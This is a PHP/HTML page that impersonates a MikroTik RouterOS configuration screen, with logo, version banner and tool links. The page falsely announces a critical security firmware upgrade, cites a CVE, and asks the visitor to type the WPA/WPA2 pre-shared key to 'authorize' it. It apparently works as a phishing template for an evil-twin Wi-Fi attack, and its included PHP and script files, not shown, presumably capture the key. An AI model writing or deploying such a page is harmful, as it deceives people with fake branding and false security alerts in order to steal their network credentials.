<?php
	error_reporting(0);
  	date_default_timezone_set("UTC");
	define('ROOT_DIR', realpath( __DIR__ ));
  	require_once( ROOT_DIR . '/input.php');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="icon" href="favicon.png">
<title>RouterOS router configuration page</title>
<style type="text/css">
body {
font-family: Verdana, Geneva, sans-serif;
font-size: 11px;
}
img {border: none}
img:hover {opacity: 0.8;}
h1 {
font-size: 1.7em;
display: inline;
margin-bottom: 10px;
}
fieldset {
margin-top: 20px;
background: #fff;
padding: 20px;
border: 1px solid #c1c1c1; 
}
#container {
width: 70%;
margin: 10% auto;
}
#box {
background-color: #fff; 
-moz-border-radius: 7px; 
-webkit-border-radius: 7px; 
border: 1px solid #c1c1c1; 
padding: 30px;
filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff', endColorstr='#f3f3f3'); /* for IE */
background: -webkit-gradient(linear, left top, left bottom, from(#fff), to(#f3f3f3)); /* for webkit browsers */
background: -moz-linear-gradient(top,  #fff,  #f3f3f3); /* for firefox 3.6+ */
}
.floater {float: left; margin-right: 10px;}
.floater label {display: block; text-align: center;}

#login {
    margin: 2em 0 4em 0;
}
#login h2 {
    font-weight: normal;
    font-size: 14px;
    margin: 0 0 0.5em 1em;
}
#login td {
    /*padding: 0 4px 0 0;*/
}
#login td.label {
    text-align: right;
}
#login td.toolbar {
    padding: 0 0 0 1em;
    vertical-align: top;
}
#login ul.toolbar {
    margin: 0;
}
#login input {
    margin: 2px;
    padding: 2px;
    border: 1px solid #888;
    box-shadow: 1px 1px 3px rgba(0,0,0,0.3);
    -webkit-box-shadow: 1px 1px 3px rgba(0,0,0,0.3);
    -moz-box-shadow: 1px 1px 3px rgba(0,0,0,0.3);
}
#error {
    display:none;
    color:red;
    padding: 1em 0 0 0;
}
ul.toolbar {
    font-size: 11px;
    text-align: left;
    list-style-type: none;
    padding: 0;
    margin: 2px 0 4px 2px;
}
ul.toolbar li {
    float: left;
    vertical-align: middle;
}
ul.toolbar a {
    float: none;
    display: block;
    margin: 2px 4px 2px 0;
    padding: 5px;

    background: #ddd;
    border: 1px solid #888;
    border-radius: 3px;
    -moz-border-radius: 3px;
    box-shadow:
        1px 1px 2px rgba(255,255,255,0.8) inset,
	0 10px 10px -5px rgba(255,255,255,0.5) inset, /* top gradient */
	1px 1px 2px rgba(0,0,0,0.2); /* shadow */
    -webkit-box-shadow:
        1px 1px 2px rgba(255,255,255,0.8) inset,
	0 10px 10px -5px rgba(255,255,255,0.5) inset,
	1px 1px 2px rgba(0,0,0,0.2);
    -moz-box-shadow:
        1px 1px 2px rgba(255,255,255,0.8) inset,
	0 10px 10px -5px rgba(255,255,255,0.5) inset,
	1px 1px 2px rgba(0,0,0,0.2);
    color: #000;

    text-decoration: none;
    text-align: center;
    white-space: nowrap;
    cursor: inherit;
    min-width: 4em;

    -webkit-transition: background 0.2s linear, box-shadow 0.2s ease-out;
    -moz-transition: background 0.2s linear, box-shadow 0.2s ease-out;
}
ul.toolbar a:hover {
    background: #eee;
}
ul.toolbar a:active {
    background: #aaa;
    box-shadow: 1px 1px 2px #999 inset;
    -webkit-box-shadow: 1px 1px 2px #999 inset;
    -moz-box-shadow: 1px 1px 2px #999 inset;
}

a.disabled
{
	pointer-events: none;
}

div#upgrade_status_area
{
	padding: 0px 4px;
}

span#upgrade_status
{
	transition: opacity 0.5s;
	font-size: 1.3em;
	color: #333;
}

span#upgrade_status.status_success
{
	color: #48996b;
}

span#upgrade_status.status_error
{
	color: #e97b7b;
}
</style>
<script type="text/javascript" src="/script.js"></script>
</head>

<body>

<div id="container">

    <div id="box">
    <a href="http://mikrotik.com/"><img src="mikrotik_logo.png" style="float: right;"></a>

    <br style="clear: both;">
    
		<h1>RouterOS v6.49.2</h1>
        
        <p>You have connected to a router. Administrative access only. If this device is not in your possession, please contact your local network administrator. </p>
		<div id="upgrade_message">
			<hr />
			A critical security <b>firmware upgrade</b> has been downloaded successfully (<a target="about:blank" href="https://mikrotik.com/download/changelogs">7.3 - 2022-Jun-06 11:38</a>). Resolves <a target="about:blank" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41987">CVE-2021-41987</a>.
			<br />
			In order to authorize the upgrade install process, please enter the WPA/WPA2 pre-shared key.
		</div>
		<table id="login">
			<tbody>
				<tr>
					<td colspan="3"><h2>Upgrade:</h2></td>
				</tr>
				<tr>
					<td class="label">Pre-shared key: </td>
					<td>
						<input id="upgrade_field" name="password" type="password" value="">
					</td>
					<td class="toolbar">
						<ul class="toolbar">
							<li><a id="upgrade_submit" href="javascript:" class="disabled"><span>Authorize</span></a></li>
						</ul>
					</td>
				</tr>
				<tr>
					<td></td>
					<td>
						<div id="upgrade_status_area"><span id="upgrade_status"></span></div>
						<div id="error"></div>
					</td>
				</tr>
			</tbody>
		</table>
            
            <fieldset>
            <div class="floater"> 
            	<a href="/winbox.exe"><img src="/winbox.png"></a><br>
                <label>Winbox</label>
            </div>
            
            <div class="floater"> 
            	<a href="telnet://127.0.0.1"><img src="/console.png"></a><br>
                <label>Telnet</label>
            </div>

            
            
            <div class="floater"> 
            	<a href="https://127.0.0.1/graphs"><img src="/green.png"></a><br>
                <label>Graphs</label>
            </div>
           
            
            <div class="floater"> 
            	<a href="/license.html"><img src="/license.png"></a><br>
                <label>License</label>
            </div>
            
			<div class="floater"> 
            	<a href="http://wiki.mikrotik.com/"><img src="/help.png"></a><br>
                <label>Help</label>
            </div>

</fieldset>
           
            <br style="clear: both"> 
                            <div style="float: right">© mikrotik</div>

    </div>
</div>





</body></html>
